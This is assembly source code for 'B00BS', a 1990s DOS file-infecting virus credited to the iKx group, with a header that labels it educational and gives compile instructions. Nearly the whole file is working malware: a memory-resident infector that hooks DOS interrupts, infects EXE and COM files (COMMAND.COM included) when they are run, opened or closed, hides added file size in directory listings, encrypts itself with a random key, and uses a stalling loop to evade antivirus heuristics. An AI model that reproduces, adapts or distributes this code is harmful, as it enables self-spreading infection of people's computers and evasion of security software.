; B00bs virus
;******************************************************************************
; THIS IS FOR EDUCATIONAL PURPOSE ONLY                               Gi0rGeTt0
;
; Virus name    : B00BS
; Author        : Unknwon :)
; Group         : iKx
; Origin        : Italy 1996/97
; Compiling     : Use TASM
;                 TASM /M2 B00BS.ASM
;                 TLINK B00BS
; Targets       : EXE COM
; Features      : stealth via 11h,12h,4eh,4fh,disinfect and infect on the fly
;                 on opening(3dh,6c00h) and closing(3eh) ,int 24h handler
;                 TSR by MCB and int21h (48h)
;                 uses some 386 instructions for some routines (just for fun)
;                 fucks TBAV,AVP,F-PROT heuristic shits
; improvements  : needs a poly engine
; payload       : none
; Greetings     : to all the guys of the iKx and all the
;                 other guys on #virus.
;
;******************************************************************************
;
; The file is a EXE


.386

CSeg SEGMENT USE16

ASSUME cs:CSeg

FileHeaderRecord struc
		  signature  dw ?
		  sizemod    dw ?
		  msize      dw ?
		  relocat    dw ?
		  headsize   dw ?
		  minalloc   dw ?
		  maxalloc   dw ?
		  stackseg   dw ?
		  stackofs   dw ?
		  check      dw ?
		  ip         dw ?
		  codes      dw ?
		  Checksum   dw ?
		  checkOvr   dw ?

FileHeaderRecord ends

SearchRecord  struc
	       date    dw ?
	       time    dw ?
SearchRecord  ends

ExecBlockRecord struc
		 Env dw ?
		 Cmd dd ?
ExecBlockRecord ends

Findrecord struc
	    FindBuf db 128 dup (?)
	    Findofs dw ?
Findrecord ends

VIR_PAR = ((END_TSR - START_TSR ) / 16) + 2
VIR_LEN = (REAL_CODE - START_TSR) + 1        ; dim virus in memoria
VIR_TRUE_LEN = ( REAL_CODE - START_TSR ) + 1 ; dimensione del virus su file


already  =  0 ; already infected
ready    =  1 ; ready to be infected
com      =  2 ; com file
exe      =  3 ; exe file
other    =  4 ; other

true     =  1
false    =  0

maxfiles = 26         ; max file no to open , must be (maxfiles*2)/4 integer

START_TSR     equ $

AfterCryp :  call SH
SH        :  pop bp
	     sub bp,3

	     push ds
	     pop  es

	     mov ax,0fe01h
	     int 2fh

	     cmp al,0ffh
	     jne short  Novirus

YesVirus :   db 0e9h
	     jmp_addr dw ?

	     mov ax,ds                                 ; ES = DS = PSP = AX
	     add ax,10h                                ; PSP +  1 paragraph
	     mov bx,cs:[bp][templateheader.stackseg]
	     add bx,ax
	     cli
	     mov ss,bx
	     mov sp,cs:[bp][templateheader.stackofs]
	     sti

	     mov bx,cs:[bp][templateheader.codes]
	     add bx,ax

	     push bx                                   ; push CS
	     push cs:[bp][templateheader.ip]           ; push IP

@jump  :     xor eax,eax
	     xor ebx,ebx
	     xor ecx,ecx
	     xor edx,edx
	     xor esi,esi
	     xor edi,edi
	     xor ebp,ebp

	     retf                                      ; jmp to host CS:IP

com_exec :   push cs                                   ; COM settings
	     mov si,bp
	     add si,offset @com_buf
	     mov di,100h
	     push di
	     cld
	     movsd
	     jmp short @jump


NoVirus  :   mov es,word ptr ds:[2ch]                  ; enviroment segment
	     mov word ptr cs:[bp][tmp_COMseg],es

	     push ds

	     mov ax,ds                                    ; DS = PSP
	     dec ax                                       ; AX = MCB
	     mov ds,ax

	     mov  bl,02h                 ; last fit
	     mov  ax,5801h
	     int  21h                    ; set

	     mov  bx,VIR_PAR             ; malloc
	     mov  ah,48h
	     int  21h
	     jnc  short malloc           ; problems ?

	     push ax dx
	     mov ah,2
	     mov dl,7
	     int 21h
	     pop dx ax

	     push ds
	     pop  ax

	     mov bx,4d03h
	     mov ds:[0],bh                                         ;'M'
	     xor bh,bh
	     sub word ptr ds:[bx],VIR_PAR
	     inc ax
	     add ax,ds:[bx]
	     mov ds,ax
	     mov word ptr ds:[bx],VIR_PAR-1
	     mov bl,'Z'
             mov ds:[0],bl                                   ; Z in last MCB

	     inc ax

malloc :     mov  es,ax

	     dec ax
	     push ax
	     pop  ds

	     mov  bx,8
	     mov  ds:[1],bx                               ; owned by dos 0008
	     mov  word ptr ds:[bx],'CS'

	     xor bl,bl                                    ; restore strategy
	     mov  ax,5801h
	     int  21h

	     cld
	     xor di,di
	     mov si,bp
	     push cs
	     pop  ds
	     mov cx,(VIR_LEN / 4) + 1
rep          movsd

	     call clean_x_stack

	     cli

	     xor ax,ax
	     mov ds,ax

	     mov eax,es
	     shl eax,16
	     mov ax,offset HOOK_21
	     xchg ds:[84h],eax
	     mov es:TRAPPED_21,eax

	     mov eax,es
	     shl eax,16
	     mov ax,offset HOOK_2F
	     xchg ds:[0bch],eax
	     mov es:TRAPPED_2F,eax

	     pop ds                                ; DS = PSP

	     mov es:sleep,FALSE
	     mov es:command_Flag,TRUE
	     mov ax,cs:[bp][tmp_COMseg]
	     mov es:COMseg,ax

	     push ds
	     pop  es

	     sti

	     jmp yesvirus

	     tmp_COMseg dw ?

HOOK_2F  :   cmp ah,0feh
	     jne short  ChkintWin
	     mov al,0ffh
	     iret

;///// Chkintwin and ChkEndwin disable the virus during installation check in
;      win311 and under Msdos prompt in w95 /////

;      Under Msdos prompt only some int21h trap worked :(( i.e 4b
;      but 3dh,3eh and some other as all long filenames functions didn't work
;      i dunno the reason since i hadn't much time for solving the question
;      if someone can explain it let me know pleaze :)

ChkintWin :  cmp ax,1605h
	     jne short chkendwin
	     mov cs:sleep,TRUE
	     jmp short pass2f

ChkEndWin :  cmp ax,1606h
	     jne short pass2f
	     mov cs:sleep,FALSE

pass2f    :  db 0eah
	     TRAPPED_2F dd ?

HOOK_21 :    cmp cs:command_flag,TRUE
	     jne short Check_int
	     call @COMM_COM

Check_int :  cmp cs:sleep,TRUE
	     je short org_21

	     cmp ax,cs:[intr_sub_w]                                   ;4b00h
	     je @EXEC00
	     cmp ax,cs:[intr_sub_w+2]                                 ;4b01h
	     je @LD&EX

	     cmp ah,cs:[intr_sub_b]                                   ;1ah
	     je @SAVEDTA
	     cmp ah,cs:[intr_sub_b+1]                                 ;4eh
	     je @FINDFIRST
	     cmp ah,cs:[intr_sub_b+2]                                 ;4fh
	     je @FINDNEXT

	     cmp ah,cs:[intr_sub_b+3]                                 ;3dh
	     je @OPEN
	     cmp ah,cs:[intr_sub_b+4]                                 ;3eh
	     je @CLOSE

	     cmp ax,cs:[intr_sub_w+4]                                 ;6c00h
	     je @EXTOPEN

	     cmp ah,cs:[intr_sub_b+5]                                 ;11h
	     je @FCB_FIND
	     cmp ah,cs:[intr_sub_b+6]                                 ;12h
	     je @FCB_FIND


org_21    :  db 0eah
	     TRAPPED_21 dd ?

@COMM_COM :  pushad
	     push ds es

	     cld
	     mov ax,cs:COMseg
	     mov es,ax
	     xor di,di
	     mov cx,256

@pre_loop :  mov eax,'SMOC'
@loop_a   :  scasd
	     jz short @nxt_ck
	     sub di,3
	     loop @loop_a

	     jmp @fail

@nxt_ck :    mov eax,'=CEP'
	     scasd
	     jz short @it_is
	     sub di,3
	     jmp short @pre_loop

@it_is :     push es
	     pop  ds
	     mov  si,di
	     push cs
	     pop  es
	     mov  di,offset Data_Buffer

	     mov cx,256

@loop_b  :   lodsb
	     or al,al
	     jz short @copy_end
	     stosb
	     loop @loop_b
@copy_end :  stosb

	     push cs
	     pop  ds
             mov  dx,offset Data_Buffer               ; DS:DX command.com path
	     mov  bx,dx

	     call GetFattrib                          ; CX attributo
	     jc short @fail

	     push cx dx ds

	     call openfile                            ; BX handle

	     call FileInfect

	     call closefile

	     pop ds dx cx

	     call SetFattrib

@fail :      pop  es ds
	     popad

	     mov cs:command_flag,FALSE

	     ret

@EXEC00   :  call CheckIfExe
	     jnz org_21

	     pushad
	     push es ds                                 ; DS:DX ASCIZ filename

	     call vir_handler

	     call getFattrib
	     jc short @no_inf                           ; CX attributo

	     push cx ds dx

	     call openfile

	     call FileInfect

	     call closefile

	     pop dx ds cx

	     call SetFattrib

@no_inf  :   call dos_handler

	     pop  ds es
	     popad

	     call int21h

	     jmp Intret


@LD&EX   :   push es ds
	     pushad

	     call vir_handler

	     call GetFattrib
	     jc short  ex_ld                          ; CX attributo

	     push cx dx ds

	     call OpenFile
	     jc short ex_ld

	     call FileClean

	     call closefile

	     pop ds dx cx

	     call SetFattrib

ex_ld  :     call dos_handler

	     popad
	     pop ds es

	     push ds dx
	     call int21h
	     pop  dx ds

	     pushf
	     push es ds
	     pushad

	     call vir_handler

	     call GetFattrib
	     jc short  not_ld                             ; CX attrib

	     push cx ds dx

	     call OpenFile

	     call FileInfect

	     call closefile

	     pop dx ds cx

	     call SetFattrib

not_ld :     call dos_handler

	     popad
	     pop ds es
	     popf
	     jmp Intret


@OPEN    :   call CheckIfExe
	     jnz org_21

	     push es ds
	     pushad

	     call vir_handler

	     call GetFattrib
	     jc short  Skip_file                           ; CX attrib

	     push cx ds dx

	     call OpenFile

	     call FileClean

	     call CloseFile

	     pop dx ds cx

	     call SetFattrib

	     call dos_handler

	     popad
	     pop ds es

	     push ds dx
	     call int21h
	     pop  dx ds
	     jc short @no_open

	     xchg ax,bx
	     call PushHandle
	     xchg bx,ax
	     jmp Intret

@no_open   : pushf
	     cmp al,5
	     jne short @no_mat

	     push es ds
	     pushad

	     call vir_handler

	     call GetFattrib
	     jc short @a

	     push cx ds dx

	     call OpenFile

	     call FileInfect

	     call CloseFile

	     pop dx ds cx

	     call SetFattrib

	     call dos_handler

@a      :    popad
	     pop ds es

@no_mat    : popf
	     jmp Intret

Skip_file  : popad
	     pop ds es

	     call dos_handler

	     jmp org_21

@EXTOPEN   : xchg si,dx
	     call CheckIfExe
	     xchg dx,si
	     jnz org_21

	     push es ds
	     pushad

	     call vir_handler

	     mov dx,si

	     call GetFattrib
	     jc short @aa

	     push cx ds dx

	     call OpenFile

	     call FileClean

	     call closefile

	     pop  dx ds cx

	     call SetFattrib

@aa   :      call dos_handler

	     popad
	     pop ds es

	     push ds si
	     call int21h
	     pop  dx ds
	     jc @no_open

	     xchg ax,bx
	     call PushHandle                                    ; save handle
	     xchg bx,ax

	     jmp Intret


; // SFT and JFT didn't work in Msdos Prompt :(( //

@CLOSE     : call Pophandle
	     jc org_21

	     call vir_handler

	     pushad
	     push ds es

	     push bx

	     mov ax,1220h                                ; BX handle
	     call int2fh                                 ; ES:DI JFT

	     xor bx,bx
	     mov bl,byte ptr es:[di]
	     mov ax,1216h                                ; bx entry number for
	     call int2fh                                 ; ES:DI SFT

	     mov byte ptr es:[di+2],2

	     pop  bx

	     call FileInfect

	     pop es ds
	     popad

	     call int21h                                  ; exec int

	     call dos_handler

	     clc
	     jmp Intret


@FINDFIRST : push ax cx si di es                         ; DS:DX find filename
	     pushf

	     mov si,dx

	     push cs
	     pop  es
	     mov  di,offset findvar

	     cld
	     push di
	     xor ax,ax
	     mov cx,(size Findvar - 2) / 2
	     rep stosw                                  ; reset Findvar
	     pop di

	     mov ah,60h                                 ; DS:SI filename
	     call Int21h                                ; ES:DI canonaized

	     mov di,offset findvar + size findvar - 2
	     mov cx,size findvar - 2 - 1

	     std
	     mov al,''
repnz        scasb
	     jz short o
	     sub di,3
o :          add di,2
	     mov cs:Findvar.Findofs,di
	     popf
	     pop  es di si cx ax

@FINDNEXT :  call int21h
	     jc Intret

FindProc :   pushad
	     push ds es
	     pushf

	     mov ds,cs:DTAseg
	     mov si,cs:DTAofs
	     add si,1eh                                  ; DS:SI punta al
							 ; filename nella DTA
	     push cs
	     pop  es

	     mov  di,cs:findvar.findofs                  ; ES:DI path filename
	     cld

CopyName:    movsb
	     cmp byte ptr ds:[si],0
	     jne short  CopyNAme
	     mov byte ptr es:[di],0

;  Findvar now has the ASCIZ filename to pass to Openfile

	     push cs
	     pop  ds
	     mov  dx,offset Findvar

	     call CheckIfExe
	     jnz short  DonotTreat

	     call OpenFile
	     jc short  DoNotTreat

	     call CheckXinf

	     cmp file_type,other
	     je short CanClose

	     cmp file_status,already
	     jne short  CanClose

	     mov es,DTAseg
	     mov di,DTAofs

	     sub dword ptr es:[di+1ah],vir_true_len - 1

CanClose :   call CloseFile

DoNotTreat:  popf
	     pop  es ds
	     popad
	     jmp Intret


@SAVEDTA :   mov  cs:DTAofs,dx
	     mov  cs:DTAseg,ds
	     jmp org_21


@FCB_FIND :  call int21h

	     pushf
	     push es ax bx

	     les bx,dword ptr cs:DTAofs

	     mov al,byte ptr es:[bx]
	     cmp al,0ffh                             ; vede se FCB esteso
	     jne short @ok_good
	     add bx,7

@ok_good :   pusha
	     push ds es

	     mov ah,47h                              ; get cur dir
	     mov dl,byte ptr es:[bx]                 ; drive number
	     push cs
	     pop  ds
	     mov si,offset FindVar
	     call int21h                             ; return ASCIZ directory

	     push cs
	     pop  es
	     cld

	     cmp byte ptr ds:[si],0                  ; root ?
	     jne short @path
	     mov ax,offset FindVar
	     add ax,3
	     mov cs:FindVar.FindOfs,ax
	     jmp short @root

@path  :     mov di,offset FindVar
	     xor al,al
@@f    :     scasb                          ; look for the end of the dirname
	     jnz short @@f

	     mov si,di
	     dec si
	     mov byte ptr es:[si],''
	     add di,3

	     mov es:FindVar.FindOfs,di
	     dec di
	     std
@cp :        movsb
	     cmp si,offset FindVar
	     jae short @cp

@root :      mov word ptr es:[offset FindVar+1],':'
	     add dl,'A' - 1
	     mov byte ptr es:[offset FindVar],dl           ; drive letter

	     pop es ds
	     popa

	     pusha
	     push ds es                              ; ES:BX DTA

	     push es
	     pop  ds                                 ; DS = ES
	     mov  si,1
	     add  si,bx                              ; file name ds:si

	     push cs
	     pop  es
	     mov  di,cs:FindVar.FindOfs

	     mov cx,8
	     cld

@lp1 :       lodsb
	     cmp al,20h
	     je short @end_1
	     stosb
	     loop @lp1

@end_1 :     mov al,'.'
	     stosb

	     mov cx,3
	     mov si,9
	     add si,bx
	     rep movsb

	     xor al,al
	     stosb                                       ; Z terminated

	     push cs
	     pop  ds
	     mov  dx, offset FindVar                      ; ASCIZ filename

	     mov bp,bx

	     call CheckIfExe
	     jnz short  @not_op

	     call OpenFile
	     jc short  @not_op

	     call CheckXinf

	     cmp file_type,other
	     je short @CanClose

	     cmp file_status,already
	     jne short @CanClose

	     mov es,cs:DTAseg
	     sub dword ptr es:[bp+1dh],VIR_TRUE_LEN - 1       ; real size

@CanClose :  call CloseFile

@not_op  :   pop es ds
	     popa


@NotInf   :  pop  bx ax es
	     popf

Intret       proc
	     cli
	     push ax
	     pushf
	     pop ax
	     add sp,8
	     push ax
	     sub sp,6
	     pop ax
	     sti
	     iret
Intret       endp


int21h       proc

	     pushf
	     call dword ptr cs:TRAPPED_21
	     ret

int21h       endp

int2fh       proc

	     pushf
	     call dword ptr cs:TRAPPED_2F
	     ret

int2fh       endp

vir_handler  proc

	     cli
	     push eax ds
	     xor ax,ax
	     mov ds,ax
	     mov eax,cs
	     shl eax,16
	     mov ax,offset critical
	     xchg ds:[90h],eax
	     mov cs:TRAPPED_24,eax
	     pop ds eax
	     sti
	     ret

vir_handler  endp

dos_handler  proc

	     push ds ax
	     cli
	     xor ax,ax
	     mov ds,ax

	     db 66h
	     dw 06c7h
	     dw 0090h
	     TRAPPED_24 dd ?                      ; mov ds:[90h],cs:TRAPPED_24

	     pop ax ds
	     sti
	     ret

dos_handler  endp


critical     proc
	     xor al,al
	     iret
critical     endp


openfile     proc

	     mov ah,3dh
	     xor al,al
	     add al,2
	   ;  mov  ax,3d02h
	     call int21h
	     mov bx,ax
	     ret                                             ; out : BX handle

openFile     endp

closeFile    proc

	     mov ah,3eh                                      ; in  : BX handle
	     call int21h
	     ret

closefile    endp

GetFAttrib   proc

	     push ax
	     mov ah,43h
	     xor al,al
	  ;   mov ax,4300h
	     push ax
	     call int21h                              ; CX attributo
	     pop ax
	     inc al
	     push cx
	    ; mov ax,4301h
	     push ax
	     call int21h
	     pop ax
	     jc short out_f
	   ;  mov ax,4301h
	     mov cx,32
	     call int21h
out_f   :    pop cx
	     pop ax                                   ; ritorna CX attributo
	     ret                                      ; ritona carry se errore

SetFattrib   proc
	     push ax                                  ; in CX attributo
	     mov ah,43h
	     xor al,al
	     inc al
	   ;  mov ax,4301h
	     call int21h
	     pop  ax
	     ret
SetFattrib   endp

GetFAttrib   endp

FileEnd      proc
	     mov ah,42h
	     xor al,al
	     add al,2
	  ;   mov ax,4202h
	     xor cx,cx
	     xor dx,dx
	     call int21h                    ; DX:AX file size
	     ret

FileEnd      endp

Filestart    proc

	     xor cx,cx
	     xor dx,dx

Filestart    endp

FileSeek     proc

	     mov ax,4200h
	     call int21h
	     ret

FileSeek     endp

blockread    proc

	     mov  ah,3fh
	     call int21h
	     ret

blockread    endp

blockwrite   proc

	     mov  ah,40h
	     call int21h
	     ret

blockwrite   endp

GetDateTime  proc

	     mov ah,57h
	     xor al,al
	  ;   mov ax,5700h
	     call Int21h
	     mov cs:searchrec.date,dx
	     mov cs:searchrec.time,cx
	     ret

GetdateTime  endp

SetDateTime  proc

	     mov dx,cs:searchrec.date
	     mov cx,cs:searchrec.time
	     mov ah,57h
	     xor al,al
	     inc al
	   ;  mov ax,5701h
	     call Int21h
	     ret

SetdateTime  endp

commit_file  proc

	     mov ah,68h
	     call int21h                                        ; commit file
	     ret

commit_file  endp

clean_x_stack proc

	      mov di,offset searchstack
	      mov cx, (size searchstack) / 4
	      xor eax,eax
rep           stosd
	      ret

clean_x_stack endp


CheckIfExe   proc                                 ; DS:DX filename

	     push es di ax

	     push ds
	     pop  es

	     cld
	     mov di,dx                           ; ES:DI filename
	     xor ax,ax
FindZ    :   scasb
	     jnz short  FindZ

	     cmp dword ptr [di-5],'exe.'
	     je short is_exe
	     cmp dword ptr [di-5],'EXE.'
	     je short is_exe
	     cmp dword ptr [di-5],'moc.'
	     je short is_exe
	     cmp dword ptr [di-5],'MOC.'

is_exe   :   pop ax di es
	     ret

CheckIfExe   endp

PushHandle    proc

	      pushf
	      push ax cx es di

	      push cs
	      pop  es
	      mov  di,offset SearchStack            ; ES:DI SearchStack
	      cld
	      mov cx,maxfiles
	      xor ax,ax
repnz         scasw
	      jnz short  Nofree
	      mov word ptr es:[di-2],bx             ; sets handle

Nofree:       pop di es cx ax
	      popf
	      ret

PushHandle    endp

PopHandle     proc

	      push ax cx es di

	      or bx,bx
	      jz short  Nofree1                              ; BX = 0 ?

	      push cs
	      pop  es

	      cld
	      mov di,offset SearchStack
	      mov cx,maxfiles
	      mov ax,bx
repnz         scasw
	      jnz short Nofree1
	      mov word ptr es:[di-2],0                 ; free handle
	      clc
	      jmp short  exitpop

Nofree1  :    stc
Exitpop  :    pop di es cx ax
	      ret

PopHandle     endp


Calc_check   proc

	     push si                                     ; DS = CS

	     xor dx,dx
	     mov si,size fileheader - 4
@chk   :     add dx,[si+offset fileheader]
	     sub si,2
	     jnz short @chk

	     pop si                                      ; DX = checksum
	     ret

Calc_check   endp

CheckXinf    proc

	     mov file_status,already

	     call Filestart

	     mov cx,size Fileheader
	     mov dx, offset Fileheader
	     call BlockRead

	     mov cx,cs:[MZsig]
	     dec cx
	     cmp fileheader.signature,cx
	     je short  IsanExe
	     mov cx,cs:[ZMsig]
	     dec cx
	     cmp fileheader.signature,cx              ; vede se e' un file EXE
	     je  short IsanExe

	     mov file_type,com

	     call FileEnd                             ; DX:AX dim file

	     sub ax,VIR_TRUE_LEN - 1
	     add ax,NONCRYPTED - START_TSR
	     sub ax,3

	     cmp ax,word ptr fileheader.signature+1
	     je GotoEnd                               ; infected

	     jmp Except

IsAnExe   :  mov file_type,exe

	     cmp fileheader.Checksum,40h
             jne short @good                        ; not a PE,NE,LE ....
	     mov file_type,other
	     jmp GotoEnd

@good  :     call calc_check

	     cmp dx,fileheader.CheckOvr
	     je GoToEnd                             ; already infected

Cont :       call FileEnd                           ; DX:AX dimens file

	     shl edx,16
	     mov dx,ax

	     movzx edi,fileheader.msize
	     movzx esi,fileheader.sizemod
	     dec edi
	     imul edi,512
	     add edi,esi

	     cmp edi,edx                             ; malloc = filesize
	     je short Except

;//**** SFT and JFT doesnt work in dos7 prompt from w95 :((        ****** ///
;//**** This is used for infecting COMMAND.COM under dos7 which is not a .COM
;//**** file but a real EXE

Chk_Com :    push bx es

	     mov ax,1220h                                ; BX handle
	     call int2fh                                 ; ES:DI JFT

	     xor bx,bx
	     mov bl,byte ptr es:[di]
	     mov ax,1216h                                ; bx entry number for
	     call int2fh                                 ; ES:DI SFT

	     cld
	     add di,20h                                  ; go to filename

	     mov eax,'MMOC'
	     scasd
	     jnz short no_com_com
	     mov eax,' DNA'
	     scasd
	     jnz short no_com_com
	     mov ax,'OC'
	     scasw
no_com_com : pop  es bx
	     jz short except

	     mov file_type,other
	     jmp short GotoEnd

except :     mov file_status,ready

GoToEnd  :   call FileEnd
	     ret
						     ; DX:AX dimensione file
CheckXinf    endp


FileInfect   proc

	     push cs cs
	     pop  ds es

	     call CheckXInf                         ; DX:AX dimens file

	     cmp file_type,other
	     je Infectexit

	     cmp file_status,ready
	     jne infectexit

	     cld
	     mov word ptr f_size,ax                 ; salva dim per .COM
	     mov si,offset fileheader
	     mov di,offset @com_buf
	     movsd

	     cmp dx,0
	     ja short @not_less

	     cmp ax,23000
	     ja short @not_less

	     jmp infectexit

@not_less :  cmp dx,7
	     ja Infectexit

	     cld
	     mov si,offset fileheader + 2
	     mov di,offset templateheader + 2
	     mov cx,(size fileheader) / 2  - 1
rep          movsw

	     push ax dx
	     add ax,VIR_TRUE_LEN
	     adc dx,0
	     mov cx,512
	     div  cx

	     inc ax                                 ; AX = quoziente  DX=resto
	     mov fileheader.msize,ax                ; nuova memory size
	     mov fileheader.sizemod,dx              ; nuovo memory module
	     pop  dx ax

	     add ax,NONCRYPTED - START_TSR
	     adc dx,0

	     mov cx,16
	     div cx                                 ; AX:DX = CS:IP

	     mov fileheader.ip,dx

	     push ax

	     xor dx,dx
	     mov ax,VIR_TRUE_LEN
	     add ax,cx
	     add fileheader.ip,ax
	     mov cx,16
	     div cx

	     sub fileheader.ip,dx

	     mov dx,fileheader.ip

	     dec dx
	     mov first_addr,dx
	     sub dx,NONCRYPTED - START_TSR
	     mov cmp_addr,dx

	     mov dx,ax

	     pop  ax

	     sub ax,dx

	     sub ax,fileheader.headsize
	     mov fileheader.codes,ax                    ; setta CS:IP nuovi
	     mov fileheader.stackseg,ax
	     add fileheader.stackofs,(VIR_PAR + 4) * 16 ; mi metto al sicuro

	     call GetDateTime

	     call calc_check                            ; dx checksum
	     mov  fileheader.checkovr,dx

LeaveSo   :  call FileStart

	     cmp file_type,com
	     jne @exe1

	     mov jmp_addr,offset com_exec - offset yesvirus - 3

	     mov byte ptr fileheader,0e9h
	     mov cx,f_size
	     add cx,NONCRYPTED - START_TSR
	     sub cx,3
	     mov word ptr fileheader+1,cx
	     add cx,102h
	     mov first_addr,cx
	     sub cx,NONCRYPTED - START_TSR
	     mov cmp_addr,cx

	     mov dx,offset FIleheader
	     mov cx,3
	     call BlockWrite

	     jmp short ordinary

@exe1     :  mov jmp_addr,0

	     mov dx,offset Fileheader
	     mov cx,size fileheader
	     call BlockWrite                             ; scrive header

ordinary   : call FileEnd

	     call Criptate                               ; return CX =
							 ; virus lenght
	     mov dx,offset Data_Buffer
	     mov cx,VIR_TRUE_LEN - 1
	     call BlockWrite

	     call SetDateTime

	     call commit_file

InfectExit : ret

FileInfect   endp

FileClean    proc

	     push cs
	     pop  ds

	     call CheckXInf                            ; DX:AX dimens file

	     cmp file_type,other
	     je clean_out

	     cmp file_status,already
	     jne clean_out

	     sub ax,size templateheader + 4              ;size @com_buf
	     sbb dx,0

	     mov cx,dx
	     mov dx,ax
	     call FileSeek

             mov cx,size templateheader + 4     ;size @com_buf
                                                ; read real fileheader
	     mov dx,offset @com_buf
	     call Blockread

	     call FileStart
	     call GetdateTime

	     cmp file_type,com
	     jne short @exe2

	     mov cx,4
	     mov dx,offset @com_buf
	     call Blockwrite
	     jmp short ordinary1

@exe2  :     mov cx,cs:[MZsig]
	     dec cx
	     mov templateheader.signature,cx
	     mov dx,offset templateHeader
	     mov cx,size templateheader
	     call BlockWrite

ordinary1 :  call fileEnd

	     sub ax,vir_true_len - 1
	     sbb dx,0

	     mov cx,dx
	     mov dx,ax
	     call FileSeek

	     xor cx,cx
	     call Blockwrite

	     call SetDateTime

	     call commit_file

clean_out :  ret

FileClean    endp

Criptate     proc

	     push bx

	     xor  bx,bx
	     mov  ds,bx
             mov  bx,word ptr ds:[46ch]         ; ritorna numero casuale

	     push cs cs
	     pop  ds es

	     mov  k_code,bl
	     mov  k1_code,bl

	     mov si,bx
	     and si,3
	     cmp si,3
	     jl short @well
	     xor si,si

@well   :    mov bh,byte ptr [offset cripstyle+si]
	     mov cripmode,bh
	     mov bh,byte ptr [offset uncripstyle+si]
	     mov uncripmode,bh

	     std
	     mov  si,offset NONCRYPTED - 1
	     mov  di,offset  Data_Buffer + (NONCRYPTED - START_TSR) - 1
@crip :      bt si,15
	     jc short @stop
	     lodsb

	     cripmode db ?
	     k_code db   ?                             ; xor add sub ,k_code

	     stosb
	     jmp short @crip

@stop    :   cld
	     mov si,offset @uncr_code
	     mov di,offset offset  Data_Buffer + (NONCRYPTED - START_TSR)
	     mov cx,REAL_CODE - offset @uncr_code
	     rep movsb

	     pop bx

	     ret
Criptate     endp

Cripstyle     db  034h                                 ; xor
	      db  04h                                  ; add
	      db  02ch                                 ; sub

Uncripstyle   db  34h                                  ; xor
	      db  2ch                                  ; sub
	      db  04h                                  ; add

Message db '|||-(BOOBS-)||| Virus , Once again deep in Terronia Land '
	db '1997 Bari'

intr_sub_w dw 4b00h,4b01h,6c00h
intr_sub_b db 1ah,4eh,4fh,3dh,3eh,11h,12h
MZsig dw 'ZM'+1
ZMsig dw 'MZ'+1

NONCRYPTED   equ $

@uncr_code : db 0beh
	     first_addr dw ?                             ; mov si,first_addr

@uncr  :     db 02eh                                     ; xor cs:[si]
	     db 80h
	     uncripmode db ?
	     k1_code  db ?

	     mov cx,4000                                 ; do-nothing loop
@m1:         inc si                                      ; to waste time
	     dec si                                      ; to
	     loop @m1                                    ; fuck AVP

	     dec si
	     db 81h
	     db 0feh
	     cmp_addr dw ?                                ; cmp si,

	     jne short @uncr

@end   :     jmp AfterCryp

@com_buf db 4 dup (?)
templateheader FileheaderRecord <>                  ; real file header

REAL_CODE    equ $

Fileheader   FileheaderRecord <>                    ; header
file_status  db ?                                   ; infection flag
file_type    db ?
sleep        db ?                                   ; flag for Windows 3.X
command_flag db ?                                   ; infect command.com ?
Searchrec    Searchrecord <>                        ; date & time record
SearchStack  dw Maxfiles dup (?)                    ; stack for f-handle
FindVar      Findrecord <>                          ; findfirst & findnext
SFT          db 03bh  dup (0)                       ; System File Table Buffer
DTAofs       dw ?                                   ; DTA for Findfirst,next
DTASeg       dw ?
COMSeg       dw ?                                   ; SEG for command.com
f_size       dw ?                                   ; com size
Data_Buffer  db VIR_TRUE_LEN + 16  dup (?)          ; Virus temp buffer


END_TSR      equ $


main    :    mov ax,ds                                    ; DS = PSP
             dec ax                                       ; AX = MCB
	     mov ds,ax

	     mov byte ptr ds:[0],'M'
	     sub word ptr ds:[3],VIR_PAR
	     inc ax
	     add ax,ds:[3]
	     mov ds,ax
             mov byte ptr ds:[0],'Z'                      ; Z nell'ultimo MCB
	     mov word ptr ds:[1],0008
	     mov word ptr ds:[3],VIR_PAR-1
	     mov word ptr ds:[8],'CS'

             inc ax                                       ; SEG TSR

	     cld
	     mov es,ax
	     xor si,si
	     xor di,di
	     push cs
	     pop  ds
	     mov cx,(VIR_LEN / 4) + 1
rep          movsd

	     call clean_x_stack

	     cli

	     xor ax,ax
	     mov ds,ax

	     mov eax,es
	     shl eax,16
	     mov ax,offset HOOK_21
	     xchg ds:[84h],eax
	     mov es:TRAPPED_21,eax

	     mov eax,es
	     shl eax,16
	     mov ax,offset HOOK_2F
	     xchg ds:[0bch],eax
	     mov es:TRAPPED_2F,eax

	     mov es:sleep,FALSE
	     mov es:command_flag,FALSE

	     sti

	     mov ax,4c00h
	     int 21h
CSeg      ends
	  end main
